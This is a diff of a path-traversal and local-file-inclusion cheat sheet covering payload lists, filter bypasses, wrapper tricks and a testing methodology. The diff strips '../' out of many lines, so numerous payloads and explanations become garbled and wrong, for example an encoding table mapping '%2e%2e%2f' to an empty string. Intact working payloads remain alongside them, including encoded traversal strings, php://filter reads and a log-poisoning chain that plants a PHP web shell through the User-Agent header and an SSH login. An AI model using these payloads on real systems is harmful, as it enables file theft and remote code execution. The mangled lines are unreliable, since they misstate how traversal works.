@@ -55,7 +55,7 @@ include("/home/user/templates/" . $template);
 ```
 
 Attack principle:
-- `../` sequence moves up one directory
+- `` sequence moves up one directory
 - Chain multiple sequences to reach root
 - Access files outside intended directory
 
@@ -104,10 +104,10 @@ Common vulnerable functionality:
 
 ```bash
 # Basic Linux traversal
-../../../etc/passwd
-../../../../etc/passwd
-../../../../../etc/passwd
-../../../../../../etc/passwd
+etc/passwd
+etc/passwd
+etc/passwd
+etc/passwd
 
 # Windows traversal
 ..\..\..\windows\win.ini
@@ -118,8 +118,8 @@ Common vulnerable functionality:
 ..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding
 
 # Test payloads with curl
-curl "http://target.com/image?filename=../../../etc/passwd"
-curl "http://target.com/download?file=....//....//....//etc/passwd"
+curl "http://target.com/image?filename=etc/passwd"
+curl "http://target.com/download?file=......etc/passwd"
 ```
 
 #### Absolute Path Injection
@@ -142,13 +142,13 @@ C:\boot.ini
 #### Bypass Stripped Traversal Sequences
 
 ```bash
-# When ../ is stripped once
-....//....//....//etc/passwd
+# When  is stripped once
+......etc/passwd
 ....\/....\/....\/etc/passwd
 
 # Nested traversal
-..././..././..././etc/passwd
-....//....//etc/passwd
+parent-dir/parent-dir/parent-dir/etc/passwd
+....etc/passwd
 
 # Mixed encoding
 ..%2f..%2f..%2fetc/passwd
@@ -160,24 +160,24 @@ C:\boot.ini
 
 ```bash
 # Null byte injection (older PHP versions)
-../../../etc/passwd%00.jpg
-../../../etc/passwd%00.png
+etc/passwd%00.jpg
+etc/passwd%00.png
 
 # Path truncation
-../../../etc/passwd...............................
+etc/passwd...............................
 
 # Double extension
-../../../etc/passwd.jpg.php
+etc/passwd.jpg.php
 ```
 
 #### Bypass Base Directory Validation
 
 ```bash
 # When path must start with expected directory
-/var/www/images/../../../etc/passwd
+/var/www/images/etc/passwd
 
 # Expected path followed by traversal
-images/../../../etc/passwd
+images/etc/passwd
 ```
 
 #### Bypass Blacklist Filters
@@ -324,11 +324,11 @@ wfuzz -c -z file,traversal.txt \
 curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
 
 # Include Apache log file
-curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
+curl "http://target.com/page?file=var/log/apache2/access.log&cmd=id"
 
 # Include auth.log (SSH)
 # First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
-curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
+curl "http://target.com/page?file=var/log/auth.log&cmd=whoami"
 ```
 
 #### Proc/self/environ
@@ -369,21 +369,21 @@ Structured testing approach:
 # Look for file-related functionality
 
 # Step 2: Test basic traversal
-../../../etc/passwd
+etc/passwd
 
 # Step 3: Test encoding variations
 ..%2F..%2F..%2Fetc%2Fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 
 # Step 4: Test bypass techniques
-....//....//....//etc/passwd
+......etc/passwd
 ..;/..;/..;/etc/passwd
 
 # Step 5: Test absolute paths
 /etc/passwd
 
 # Step 6: Test with null bytes (legacy)
-../../../etc/passwd%00.jpg
+etc/passwd%00.jpg
 
 # Step 7: Attempt wrapper exploitation
 php://filter/convert.base64-encode/resource=index.php
@@ -439,9 +439,9 @@ def safe_file_access(base_dir, filename):
 
 | Payload | Target |
 |---------|--------|
-| `../../../etc/passwd` | Linux password file |
+| `etc/passwd` | Linux password file |
 | `..\..\..\..\windows\win.ini` | Windows INI file |
-| `....//....//....//etc/passwd` | Bypass simple filter |
+| `......etc/passwd` | Bypass simple filter |
 | `/etc/passwd` | Absolute path |
 | `php://filter/convert.base64-encode/resource=config.php` | Source code |
 
@@ -460,8 +460,8 @@ def safe_file_access(base_dir, filename):
 
 | Type | Example |
 |------|---------|
-| URL Encoding | `%2e%2e%2f` = `../` |
-| Double Encoding | `%252e%252e%252f` = `../` |
+| URL Encoding | `%2e%2e%2f` = `` |
+| Double Encoding | `%252e%252e%252f` = `` |
 | Unicode | `%c0%af` = `/` |
 | Null Byte | `%00` |
 
